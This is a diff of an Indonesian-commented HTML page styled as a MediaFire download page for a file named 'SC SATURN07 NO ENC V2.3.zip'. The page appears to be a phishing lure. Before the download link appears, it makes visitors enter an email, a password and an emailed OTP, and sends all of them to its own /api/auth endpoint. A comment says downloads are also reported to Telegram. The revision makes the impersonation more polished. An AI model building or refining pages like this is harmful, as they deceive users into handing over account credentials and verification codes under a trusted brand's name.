@@ -1,170 +1,279 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SC SATURN07 NO ENC V2.3 - MediaFire</title>
+    <title>MediaFire - SC SATURN07 NO ENC V2.3</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        body { background-color: #f3f3f3; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        .mf-header { background: #0070f3; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
-        .file-card { background: white; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
-        .download-btn { background: #0070f3; transition: background 0.3s; }
-        .download-btn:hover { background: #005cc5; }
-        .footer-link { color: #666; font-size: 13px; transition: color 0.2s; }
-        .footer-link:hover { color: #0070f3; text-decoration: underline; }
-        /* Animasi masuk */
-        .fade-in { animation: fadeIn 0.5s ease-in; }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
+        
+        body { 
+            background-color: #f0f4f8; 
+            font-family: 'Roboto', sans-serif;
+            margin: 0;
+        }
+
+        .mf-header {
+            background-color: #0070f3;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .card {
+            background: #ffffff;
+            border-radius: 3px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24);
+        }
+
+        .btn-download {
+            background-color: #0070f3;
+            transition: all 0.2s ease;
+        }
+
+        .btn-download:hover {
+            background-color: #005cc5;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+
+        .footer-link {
+            transition: color 0.2s;
+        }
+
+        .footer-link:hover {
+            color: #0070f3;
+        }
+
+        /* Animasi */
+        .fade-in { animation: fadeIn 0.6s ease-out; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        .hidden { display: none; }
     </style>
 </head>
 <body class="min-h-screen flex flex-col">
 
-    <audio id="bgMusic" loop autoplay>
+    <audio id="bgMusic" loop>
         <source src="https://files.catbox.moe/c2genm.mp3" type="audio/mpeg">
     </audio>
 
-    <header class="mf-header p-4 flex justify-between items-center text-white">
+    <nav class="mf-header text-white px-4 py-3 flex justify-between items-center">
         <div class="flex items-center gap-2">
             <i class="fa-solid fa-cloud-arrow-down text-2xl"></i>
-            <span class="font-bold text-xl tracking-tighter">MediaFire</span>
+            <span class="font-black text-xl tracking-tighter italic">MediaFire</span>
         </div>
-        <div class="text-sm opacity-80">Premium Cloud Storage</div>
-    </header>
+        <div class="hidden md:block text-sm font-medium opacity-90">
+            Storage | Upgrade to Pro
+        </div>
+    </nav>
 
     <main class="flex-grow flex flex-col items-center justify-center p-4 fade-in">
         
-        <div id="auth-section" class="file-card w-full max-w-md p-8">
-            <h2 class="text-xl font-bold text-gray-700 mb-6 border-b pb-2">Account Verification</h2>
-            <div class="space-y-4">
-                <input type="email" id="email" placeholder="Email Address" class="w-full border p-3 rounded focus:border-blue-500 outline-none">
-                <input type="password" id="pass" placeholder="Password" class="w-full border p-3 rounded focus:border-blue-500 outline-none">
-                <button onclick="reqOTP()" id="btn-otp" class="w-full download-btn text-white font-bold py-3 rounded shadow-md">VERIFY ACCOUNT</button>
-            </div>
+        <div id="auth-section" class="card w-full max-w-md p-6 border-t-4 border-blue-500">
+            <h2 class="text-xl font-bold text-gray-700 mb-2">Verify Access</h2>
+            <p class="text-sm text-gray-500 mb-6">Login to access premium files.</p>
             
-            <div id="otp-area" class="hidden mt-6 pt-6 border-t">
-                <p class="text-xs text-gray-500 mb-2">Check your email for 6-digit OTP code.</p>
-                <input type="text" id="otp" maxlength="6" placeholder="Enter OTP" class="w-full border p-3 rounded text-center tracking-widest font-bold outline-none border-blue-400 bg-blue-50">
-                <button onclick="login()" class="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-3 rounded mt-3 shadow-md transition">CONFIRM & LOGIN</button>
+            <div class="space-y-4">
+                <div class="relative">
+                    <i class="fa-solid fa-envelope absolute left-3 top-3.5 text-gray-400"></i>
+                    <input type="email" id="email" placeholder="Email Address" class="w-full border border-gray-300 p-3 pl-10 rounded focus:border-blue-500 outline-none transition">
+                </div>
+                <div class="relative">
+                    <i class="fa-solid fa-lock absolute left-3 top-3.5 text-gray-400"></i>
+                    <input type="password" id="pass" placeholder="Password" class="w-full border border-gray-300 p-3 pl-10 rounded focus:border-blue-500 outline-none transition">
+                </div>
+                <button onclick="reqOTP()" id="btn-otp" class="w-full btn-download text-white font-bold py-3 rounded shadow-md uppercase tracking-wider">
+                    Get OTP Code
+                </button>
+            </div>
+
+            <div id="otp-area" class="hidden mt-6 pt-6 border-t border-dashed">
+                <p class="text-xs text-blue-600 font-bold mb-2 uppercase tracking-widest text-center">Check Your Email</p>
+                <input type="text" id="otp" maxlength="6" placeholder="0 0 0 0 0 0" class="w-full border-2 border-blue-200 p-3 rounded text-center text-2xl font-black tracking-[10px] focus:border-blue-500 outline-none bg-blue-50">
+                <button onclick="login()" class="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-3 rounded mt-4 shadow-md transition uppercase">
+                    Verify & Access File
+                </button>
             </div>
         </div>
 
         <div id="dl-section" class="hidden w-full max-w-4xl">
             
-            <div class="file-card p-4 mb-4 flex flex-wrap items-center justify-between gap-4 border-l-4 border-blue-500">
-                <div>
-                    <p class="text-xs text-gray-400 uppercase font-bold">User Account</p>
-                    <p id="display-email" class="font-semibold text-gray-700">user@email.com</p>
+            <div class="card p-4 mb-4 flex flex-wrap items-center justify-between border-l-4 border-green-500">
+                <div class="flex items-center gap-3">
+                    <div class="h-10 w-10 bg-gray-100 rounded-full flex items-center justify-center text-blue-500 border border-gray-200">
+                        <i class="fa-solid fa-user"></i>
+                    </div>
+                    <div>
+                        <p id="display-email" class="font-bold text-gray-800 leading-none">user@email.com</p>
+                        <p id="created-date" class="text-xs text-gray-500 mt-1 uppercase font-semibold tracking-tighter"></p>
+                    </div>
                 </div>
                 <div class="text-right">
-                    <p class="text-xs text-gray-400 uppercase font-bold">Member Since</p>
-                    <p id="created-date" class="font-semibold text-gray-700">12 Mei 2026</p>
+                    <span class="bg-green-100 text-green-700 text-[10px] font-bold px-2 py-1 rounded uppercase">Authorized Access</span>
                 </div>
             </div>
 
-            <div class="file-card p-6 flex flex-col md:flex-row items-center gap-8">
-                <div class="bg-blue-50 p-6 rounded text-blue-500">
-                    <i class="fa-solid fa-file-zipper text-7xl"></i>
+            <div class="card p-8 flex flex-col md:flex-row items-center gap-10">
+                <div class="relative group">
+                    <div class="bg-blue-50 p-10 rounded shadow-inner text-blue-500 group-hover:scale-105 transition-transform duration-300">
+                        <i class="fa-solid fa-file-zipper text-8xl"></i>
+                    </div>
+                    <div class="absolute -bottom-2 -right-2 bg-white px-2 py-1 shadow text-[10px] font-bold text-blue-500 border border-blue-100 uppercase">ZIP FILE</div>
                 </div>
+                
                 <div class="flex-grow text-center md:text-left">
-                    <h1 class="text-2xl font-bold text-gray-800">SC SATURN07 NO ENC V2.3.zip</h1>
-                    <p class="text-sm text-gray-500 mt-1">File size: 14.52 MB</p>
-                    <div class="mt-6">
-                        <button onclick="startDownload()" class="download-btn text-white px-12 py-4 rounded font-bold text-lg shadow-lg flex items-center gap-3 mx-auto md:mx-0">
-                            <i class="fa-solid fa-download"></i> DOWNLOAD
+                    <h1 class="text-3xl font-bold text-gray-800 tracking-tight">SC SATURN07 NO ENC V2.3</h1>
+                    <div class="flex flex-wrap justify-center md:justify-start gap-4 mt-2 text-sm text-gray-500">
+                        <span><i class="fa-solid fa-weight-hanging mr-1"></i> 14.52 MB</span>
+                        <span><i class="fa-solid fa-calendar-day mr-1"></i> May 2026</span>
+                    </div>
+                    
+                    <div class="mt-8 flex flex-col md:flex-row gap-4 items-center">
+                        <button onclick="startDownload()" class="btn-download text-white px-10 py-4 rounded font-black text-xl shadow-xl flex items-center gap-4 w-full md:w-auto justify-center">
+                            <i class="fa-solid fa-download animate-bounce"></i> DOWNLOAD
                         </button>
+                        <p class="text-xs text-gray-400 italic">Preparing for direct download...</p>
                     </div>
                 </div>
             </div>
 
-            <div class="mt-8 grid grid-cols-1 md:grid-cols-2 gap-4">
-                <div class="file-card p-4 text-center">
-                    <p class="text-sm text-gray-500">Total Scripts Downloaded</p>
-                    <p id="total-dl" class="text-2xl font-bold text-blue-600">...</p>
+            <div class="mt-6 grid grid-cols-2 gap-4">
+                <div class="card p-4 text-center">
+                    <p class="text-[10px] text-gray-400 uppercase font-black">Global Downloads</p>
+                    <p id="total-dl" class="text-2xl font-bold text-gray-700">0</p>
                 </div>
-                <div class="file-card p-4 text-center">
-                    <p class="text-sm text-gray-500">Global Users Registered</p>
-                    <p id="total-users" class="text-2xl font-bold text-blue-600">...</p>
+                <div class="card p-4 text-center">
+                    <p class="text-[10px] text-gray-400 uppercase font-black">Active Users</p>
+                    <p id="total-users" class="text-2xl font-bold text-gray-700">0</p>
                 </div>
             </div>
         </div>
     </main>
 
-    <footer class="bg-white p-6 mt-10 border-t border-gray-200">
-        <div class="max-w-4xl mx-auto flex flex-wrap justify-center gap-8 text-center font-medium">
-            <a href="https://kaaaoffc.web.id" class="footer-link"><i class="fa-solid fa-cart-shopping mr-1"></i> TOPUP GAME</a>
-            <a href="https://t.me/autoorderkaabot" class="footer-link"><i class="fa-brands fa-telegram mr-1"></i> ORDER PANEL</a>
-            <a href="https://wa.me/6285137572401" class="footer-link"><i class="fa-brands fa-whatsapp mr-1"></i> WHATSAPP</a>
+    <footer class="bg-white border-t border-gray-200 mt-10">
+        <div class="max-w-4xl mx-auto py-8 px-4">
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-6 text-center">
+                <a href="https://kaaaoffc.web.id" target="_blank" class="footer-link group">
+                    <div class="text-blue-500 mb-2 text-xl group-hover:scale-110 transition"><i class="fa-solid fa-shopping-cart"></i></div>
+                    <p class="font-bold text-gray-700">TOPUP GAME</p>
+                    <p class="text-[10px] text-gray-400">Cheap & Reliable Services</p>
+                </a>
+                <a href="https://t.me/autoorderkaabot" target="_blank" class="footer-link group">
+                    <div class="text-blue-500 mb-2 text-xl group-hover:scale-110 transition"><i class="fa-solid fa-server"></i></div>
+                    <p class="font-bold text-gray-700">ORDER PANEL</p>
+                    <p class="text-[10px] text-gray-400">24/7 Auto Order Telegram Bot</p>
+                </a>
+                <a href="https://wa.me/6285137572401" target="_blank" class="footer-link group">
+                    <div class="text-green-500 mb-2 text-xl group-hover:scale-110 transition"><i class="fa-brands fa-whatsapp"></i></div>
+                    <p class="font-bold text-gray-700">WHATSAPP</p>
+                    <p class="text-[10px] text-gray-400">Direct Contact for Support</p>
+                </a>
+            </div>
+            <div class="mt-10 pt-6 border-t border-gray-100 text-center">
+                <p class="text-[10px] text-gray-400 tracking-[4px] uppercase">&copy; 2026 KAAA CLOUD - ALL RIGHTS RESERVED</p>
+            </div>
         </div>
-        <p class="text-center text-gray-400 text-[10px] mt-6 tracking-widest uppercase">© 2026 KAAA CLOUD - PROTECTED SYSTEM</p>
     </footer>
 
     <script>
-        // Tanggal otomatis buat info akun
-        document.getElementById('created-date').innerText = new Date().toLocaleDateString('id-ID', {day:'numeric', month:'long', year:'numeric'});
+        // Tanggal Dinamis untuk Info Akun
+        const today = new Date();
+        document.getElementById('created-date').innerText = "Session Started: " + today.toLocaleDateString('id-ID', { day: 'numeric', month: 'long', year: 'numeric' });
 
+        // Fungsi Load Stats (Total User & Download)
         async function loadStats() {
             try {
                 const res = await fetch('/api/stats');
                 const data = await res.json();
-                document.getElementById('total-dl').innerText = data.totalDownloads || '128';
-                document.getElementById('total-users').innerText = data.totalUsers || '42';
-            } catch (e) { console.log("Stats error"); }
-        }
-
-        async function reqOTP() {
-            const email = document.getElementById('email').value;
-            const pass = document.getElementById('pass').value;
-            if(!email || !pass) return alert('Lengkapi Email & Password!');
-
-            document.getElementById('btn-otp').innerText = "SENDING OTP...";
-            
-            const res = await fetch('/api/auth', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ action: 'SEND_OTP', email })
-            });
-
-            if(res.ok) {
-                document.getElementById('otp-area').classList.remove('hidden');
-                document.getElementById('btn-otp').innerText = "RESEND OTP";
-            } else {
-                alert('Gagal kirim OTP. Periksa config!');
+                document.getElementById('total-dl').innerText = data.totalDownloads || '0';
+                document.getElementById('total-users').innerText = data.totalUsers || '0';
+            } catch (e) {
+                console.log("Stats error");
             }
         }
 
+        // Fungsi Request OTP
+        async function reqOTP() {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
+            if(!email || !pass) return alert('Masukkan Email dan Password!');
+
+            const btn = document.getElementById('btn-otp');
+            btn.innerText = "Processing...";
+            btn.disabled = true;
+
+            try {
+                const res = await fetch('/api/auth', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ action: 'SEND_OTP', email })
+                });
+
+                if(res.ok) {
+                    document.getElementById('otp-area').classList.remove('hidden');
+                    btn.innerText = "RESEND OTP";
+                    btn.disabled = false;
+                } else {
+                    alert('Gagal mengirim OTP. Cek config!');
+                    btn.innerText = "Get OTP Code";
+                    btn.disabled = false;
+                }
+            } catch (e) {
+                alert('Server Error!');
+                btn.disabled = false;
+            }
+        }
+
+        // Fungsi Login & Verifikasi
         async function login() {
             const email = document.getElementById('email').value;
             const password = document.getElementById('pass').value;
             const otp = document.getElementById('otp').value;
 
-            const res = await fetch('/api/auth', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ action: 'VERIFY_LOGIN', email, password, otp })
-            });
+            try {
+                const res = await fetch('/api/auth', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ action: 'VERIFY_LOGIN', email, password, otp })
+                });
 
-            if(res.ok) {
-                document.getElementById('display-email').innerText = email;
-                document.getElementById('auth-section').classList.add('hidden');
-                document.getElementById('dl-section').classList.remove('hidden');
-                loadStats();
-                // Play music on interaction
-                document.getElementById('bgMusic').play();
-            } else {
-                alert('OTP Salah!');
+                if(res.ok) {
+                    document.getElementById('display-email').innerText = email;
+                    document.getElementById('auth-section').classList.add('hidden');
+                    document.getElementById('dl-section').classList.remove('hidden');
+                    
+                    // Putar musik setelah ada interaksi login
+                    document.getElementById('bgMusic').play().catch(e => console.log("Autoplay blocked"));
+                    loadStats();
+                } else {
+                    alert('Kode OTP Salah!');
+                }
+            } catch (e) {
+                alert('Login Gagal!');
             }
         }
 
+        // Fungsi Download (Pasti Mengarah ke MediaFire)
         async function startDownload() {
-            const res = await fetch('/api/download', { method: 'POST' });
-            const data = await res.json();
-            // Langsung arahkan ke link MediaFire
-            window.location.href = data.url;
+            const directLink = "https://www.mediafire.com/file/k001s9hokumihr1/SC+SATURN07+NO+ENC+V2.3.zip/file";
+            
+            // Langsung buka link MediaFire di tab baru
+            window.open(directLink, '_blank');
+
+            // Kirim notifikasi download ke Telegram di background
+            try {
+                await fetch('/api/download', { 
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'}
+                });
+                loadStats();
+            } catch (e) {
+                console.log("Notif failed but download started");
+            }
         }
 
-        // Jalankan stats saat load
+        // Jalankan stats saat load awal
         loadStats();
     </script>
 </body>
